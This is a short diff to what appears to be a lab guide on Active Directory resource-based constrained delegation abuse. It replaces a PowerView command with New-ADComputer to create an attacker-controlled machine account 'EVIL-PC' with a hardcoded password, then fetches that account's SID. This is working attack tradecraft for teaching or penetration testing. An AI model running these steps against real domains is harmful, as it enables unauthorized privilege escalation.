@@ -137,7 +137,11 @@ Get-ADComputer -Identity "RBCD-PC" -Properties TrustedForDelegation, msDS-Allowe
 ```
 ```powershell
 # With PowerView (in a lowpriv-user context)
-New-MachineAccount -MachineAccount "EVIL-PC" -Password (ConvertTo-SecureString "Ev1lP@ss123!" -AsPlainText -Force) -Domain "warzone.oxsium.local"
+$ComputerName = "EVIL-PC"
+$Password = ConvertTo-SecureString "Ev1lP@ss123!" -AsPlainText -Force
+New-ADComputer -Name $ComputerName -SAMAccountName "$ComputerName$" `
+    -AccountPassword $Password -Enabled $true `
+    -Path "CN=Computers,DC=warzone,DC=oxsium,DC=local"
 
 $evilSID = Get-DomainComputer -Identity "EVIL-PC" -Properties objectsid -Domain "warzone.oxsium.local" | Select -Expand objectsid
 
